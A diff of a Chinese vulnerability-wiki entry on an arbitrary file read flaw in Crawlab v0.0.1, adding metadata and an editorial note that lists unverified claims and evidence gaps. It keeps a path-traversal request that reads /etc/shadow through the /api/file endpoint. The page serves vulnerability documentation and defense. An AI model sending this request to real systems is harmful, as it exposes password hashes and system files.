@@ -1,9 +1,50 @@
 ---
 version: "Crawlab v0.0.1"
 source: "Threekiii/Vulnerability-Wiki"
+title: "Crawlab file 任意文件读取漏洞"
+product: "Crawlab"
+record_type: "analysis"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "unknown"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_role: "unknown"
+prerequisites: "v0.0.1 claimed; authenticated token or separate users-add flaw; service file permissions"
+affected_versions: "Crawlab v0.0.1"
+source_status: "unknown"
+side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
+id: "vw-8cbe5f0a8a433b4af97da060"
+entity_id: "ve-8cbe5f0a8a433b4af97da060"
+schema_version: "1"
 ---
 
 # Crawlab file 任意文件读取漏洞
+
+<!-- vulwiki-editorial:start -->
+## 校订与适用边界
+
+- 适用前提：v0.0.1 claimed; authenticated token or separate users-add flaw; service file permissions
+- 证据范围：ReadFile(path) source supports arbitrary path input; shown request uses token
+
+### 本次正文校订
+
+- 按实际内容修正 1 处代码围栏语言标记，保留其中方法与请求内容。
+
+### 尚未解决的证据缺口
+
+以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：
+
+- Cross-link distinct users-add flaw rather than calling file read intrinsically unauthenticated
+- Captured JWT/cookies/spoof headers require sanitization and necessity explanation
+- Exact version/commit and patch source absent
+- No textual response beyond screenshot; /etc/shadow access depends service permissions
+
+本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
+<!-- vulwiki-editorial:end -->
+
+## 技术正文与历史材料
 
 ## 漏洞描述
 
@@ -69,7 +110,7 @@ func GetFile(c *gin.Context) {
 
 path参数可控，发送Get请求读取任意文件
 
-```
+```http
 GET /api/file?path=../../etc/shadow HTTP/1.1
 Host: 
 Content-Length: 0
